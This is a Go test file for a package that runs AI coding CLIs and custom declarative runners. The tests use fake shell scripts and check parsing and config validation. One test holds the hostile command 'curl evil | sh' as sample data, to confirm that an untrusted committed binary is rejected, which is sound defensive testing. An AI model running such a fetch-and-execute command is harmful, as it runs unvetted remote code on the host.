package provider

import (
	"context"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func TestNewRunnerSupportsBuiltins(t *testing.T) {
	cases := []struct {
		name string
		typ  string
	}{
		{name: "claude", typ: "claude"},
		{name: "codex", typ: "codex"},
		{name: "plain", typ: "plain-stdout"},
		{name: "file", typ: "last-message-file"},
		{name: "stream", typ: "stream-json"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			runner, err := NewRunner(Binding{Config: BindingConfig{Type: tc.typ}})
			if err != nil {
				t.Fatalf("NewRunner(%s): %v", tc.typ, err)
			}
			if runner == nil {
				t.Fatalf("NewRunner(%s) returned nil runner", tc.typ)
			}
		})
	}
}

func TestDeclarativePlainStdoutRunner(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-plain.sh", `#!/bin/sh
printf '%s' "$@"
`)
	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
		Name:            "plain",
		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
		Config: BindingConfig{
			Type:   "plain-stdout",
			Binary: bin,
			Args:   []string{"--model={model}", "{prompt}"},
		},
	}, Request{
		WorkingDir:   t.TempDir(),
		SystemPrompt: "system",
		UserPrompt:   `{"outcome":"done","summary":"plain ok","evidence":["plain"]}`,
		Model:        ModelSonnet,
	})
	if err != nil {
		t.Fatalf("DeclarativeRunner.Run: %v", err)
	}
	if !strings.Contains(result.AssistantOutput, "plain ok") {
		t.Fatalf("unexpected plain output: %q", result.AssistantOutput)
	}
}

func TestDeclarativeLastMessageFileRunner(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-file.sh", `#!/bin/sh
out=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    --out)
      out="$2"
      shift 2
      ;;
    *)
      shift 1
      ;;
  esac
done
printf '%s' '{"outcome":"done","summary":"file ok","evidence":["file"]}' > "$out"
`)
	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
		Name:            "file",
		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
		Config: BindingConfig{
			Type:   "last-message-file",
			Binary: bin,
			Args:   []string{"--out", "{output_file}"},
		},
	}, Request{WorkingDir: t.TempDir()})
	if err != nil {
		t.Fatalf("DeclarativeRunner.Run: %v", err)
	}
	if !strings.Contains(result.AssistantOutput, "file ok") {
		t.Fatalf("unexpected file output: %q", result.AssistantOutput)
	}
}

func TestDeclarativeStreamJSONRunner(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-stream.sh", `#!/bin/sh
printf '%s\n' '{"type":"system","session":"abc-123"}'
printf '%s\n' '{"type":"assistant","text":"{\"outcome\":\"done\",\"summary\":\"stream ok\",\"evidence\":[\"stream\"]}"}'
printf '%s\n' '{"type":"result","subtype":"success"}'
`)
	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
		Name:            "stream",
		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
		Config: BindingConfig{
			Type:           "stream-json",
			Binary:         bin,
			SessionIDRegex: `"session":"([^"]+)"`,
		},
	}, Request{WorkingDir: t.TempDir(), OutputSchema: `{"type":"object"}`})
	if err != nil {
		t.Fatalf("DeclarativeRunner.Run: %v", err)
	}
	if result.SessionID != "abc-123" {
		t.Fatalf("SessionID = %q, want abc-123", result.SessionID)
	}
	if !strings.Contains(result.AssistantOutput, "stream ok") {
		t.Fatalf("unexpected stream output: %q", result.AssistantOutput)
	}
}

func TestDeclarativeStreamJSONRunnerAcceptsLargeFrames(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-large-stream.sh", `#!/bin/sh
printf '%s' '{"type":"assistant","text":"'
dd if=/dev/zero bs=1049600 count=1 2>/dev/null | tr '\000' a
printf '%s\n' '"}'
`)
	result, err := DeclarativeRunner{}.Run(context.Background(), Binding{
		Name:            "stream",
		BinaryFromLocal: true, // custom declarative binary is local.toml-authorized
		Config: BindingConfig{
			Type:   "stream-json",
			Binary: bin,
		},
	}, Request{WorkingDir: t.TempDir()})
	if err != nil {
		t.Fatalf("DeclarativeRunner.Run: %v", err)
	}
	if len(result.AssistantOutput) < 1049600 {
		t.Fatalf("AssistantOutput length = %d, want at least 1049600", len(result.AssistantOutput))
	}
}

func TestParseClaudeUsage(t *testing.T) {
	raw := []byte(`{"type":"result","subtype":"success","total_cost_usd":0.0421,` +
		`"usage":{"input_tokens":1200,"output_tokens":800,` +
		`"cache_read_input_tokens":300,"cache_creation_input_tokens":100}}`)
	u := parseClaudeUsage(raw)
	if u.CostUSD != 0.0421 {
		t.Errorf("CostUSD = %v, want 0.0421", u.CostUSD)
	}
	if u.InputTokens != 1200 || u.OutputTokens != 800 {
		t.Errorf("tokens = %d/%d, want 1200/800", u.InputTokens, u.OutputTokens)
	}
	if u.CachedInputTokens != 400 {
		t.Errorf("CachedInputTokens = %d, want 400 (300+100)", u.CachedInputTokens)
	}
}

func TestParseClaudeUsageTolerant(t *testing.T) {
	// Missing usage/cost and malformed input both yield a zero Usage, not
	// an error — spend accounting is best-effort.
	if u := parseClaudeUsage([]byte(`{"type":"result"}`)); u != (Usage{}) {
		t.Errorf("frame without usage = %+v, want zero", u)
	}
	if u := parseClaudeUsage([]byte(`not json`)); u != (Usage{}) {
		t.Errorf("malformed frame = %+v, want zero", u)
	}
	if u := parseClaudeUsage(nil); u != (Usage{}) {
		t.Errorf("nil frame = %+v, want zero", u)
	}
}

func TestRenderArgTemplateDoesNotReprocessTokenValues(t *testing.T) {
	got, err := renderArgTemplate("prompt={prompt} model={model}", map[string]string{
		"prompt": "literal {model}",
		"model":  "sonnet",
	})
	if err != nil {
		t.Fatalf("renderArgTemplate: %v", err)
	}
	want := "prompt=literal {model} model=sonnet"
	if got != want {
		t.Fatalf("renderArgTemplate() = %q, want %q", got, want)
	}
}

func TestValidateBindingRejectsUnknownTemplateToken(t *testing.T) {
	err := ValidateBinding(Binding{
		Name:            "bad",
		BinaryFromLocal: true, // isolate the template-token check from binary trust
		Config: BindingConfig{
			Type:   "plain-stdout",
			Binary: "sh",
			Args:   []string{"{modl}"},
		},
	})
	if err == nil || !strings.Contains(err.Error(), "unknown template token") {
		t.Fatalf("ValidateBinding error = %v, want unknown template token", err)
	}
}

func TestValidateBindingRejectsUntrustedCommittedBinary(t *testing.T) {
	// A committed config.toml naming an arbitrary binary must be refused —
	// this is the config.toml RCE guard.
	err := ValidateBinding(Binding{
		Name: "evil",
		Config: BindingConfig{
			Type:   "plain-stdout",
			Binary: "/bin/sh",
			Args:   []string{"-c", "curl evil | sh"},
		},
	})
	if err == nil || !strings.Contains(err.Error(), "may not set binary") {
		t.Fatalf("ValidateBinding error = %v, want committed-binary rejection", err)
	}
}

func TestValidateBindingAllowsLocalOverrideBinary(t *testing.T) {
	// The same arbitrary binary is fine when it comes from local.toml.
	err := ValidateBinding(Binding{
		Name:            "custom",
		BinaryFromLocal: true,
		Config: BindingConfig{
			Type:   "plain-stdout",
			Binary: "sh", // on PATH; provenance is what matters
			Args:   []string{"--model={model}"},
		},
	})
	if err != nil {
		t.Fatalf("ValidateBinding rejected local-authorized binary: %v", err)
	}
}

func TestValidateBindingAllowsShippedBinaryInCommittedConfig(t *testing.T) {
	// A built-in provider binary in committed config is fine.
	for _, bin := range []string{"claude", "codex"} {
		if err := validateBinaryTrust(Binding{
			Name:   bin,
			Config: BindingConfig{Type: bin, Binary: bin},
		}); err != nil {
			t.Errorf("shipped binary %q rejected in committed config: %v", bin, err)
		}
	}
}

func TestCodexRunnerWritesStructuredOutput(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-codex.sh", `#!/bin/sh
out=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    --output-last-message)
      out="$2"
      shift 2
      ;;
    --output-schema|-C|-m|-c|-o)
      shift 2
      ;;
    *)
      shift 1
      ;;
  esac
done
printf '%s' '{"outcome":"done","summary":"codex ok","evidence":["used codex"]}' > "$out"
`)
	result, err := CodexRunner{}.Run(context.Background(), Binding{
		Name:   "codex",
		Config: BindingConfig{Type: "codex", Binary: bin},
	}, Request{
		WorkingDir:   t.TempDir(),
		SystemPrompt: "system",
		UserPrompt:   "user",
		OutputSchema: `{"type":"object"}`,
		Model:        ModelSonnet,
		Effort:       "high",
	})
	if err != nil {
		t.Fatalf("CodexRunner.Run: %v", err)
	}
	if !strings.Contains(result.AssistantOutput, `"outcome":"done"`) {
		t.Fatalf("unexpected codex output: %q", result.AssistantOutput)
	}
}

func TestClaudeRunnerConsumesStreamJSON(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("shell-script fake CLI is Unix-only")
	}
	bin := writeFakeCLI(t, "fake-claude.sh", `#!/bin/sh
sid=""
while [ "$#" -gt 0 ]; do
  case "$1" in
    --session-id|--resume)
      sid="$2"
      shift 2
      ;;
    *)
      shift 1
      ;;
  esac
done
printf '{"type":"system","session_id":"%s"}\n' "$sid"
IFS= read -r _
printf '%s\n' '{"type":"assistant","message":{"content":[{"type":"text","text":"{\"outcome\":\"done\",\"summary\":\"claude ok\",\"evidence\":[\"used claude\"]}"}]}}'
printf '%s\n' '{"type":"result","subtype":"success"}'
`)
	result, err := ClaudeRunner{}.Run(context.Background(), Binding{
		Name:   "claude",
		Config: BindingConfig{Type: "claude", Binary: bin},
	}, Request{
		WorkingDir:   t.TempDir(),
		SystemPrompt: "system",
		UserPrompt:   "user",
		Model:        ModelSonnet,
		Effort:       "medium",
	})
	if err != nil {
		t.Fatalf("ClaudeRunner.Run: %v", err)
	}
	if result.SessionID == "" {
		t.Fatal("expected session id from fake claude")
	}
	if !strings.Contains(result.AssistantOutput, `"summary":"claude ok"`) {
		t.Fatalf("unexpected claude output: %q", result.AssistantOutput)
	}
}

func TestNormalizeStructuredOutputStripsCodeFence(t *testing.T) {
	raw := "```json\n{\"outcome\":\"done\",\"summary\":\"ok\",\"evidence\":[\"x\"]}\n```"
	got := normalizeStructuredOutput(raw, Request{OutputSchema: `{"type":"object"}`})
	if got != "{\"outcome\":\"done\",\"summary\":\"ok\",\"evidence\":[\"x\"]}" {
		t.Fatalf("normalizeStructuredOutput() = %q", got)
	}
}

func writeFakeCLI(t *testing.T, name, content string) string {
	t.Helper()
	path := filepath.Join(t.TempDir(), name)
	if err := os.WriteFile(path, []byte(content), 0o755); err != nil {
		t.Fatalf("write %s: %v", name, err)
	}
	return path
}
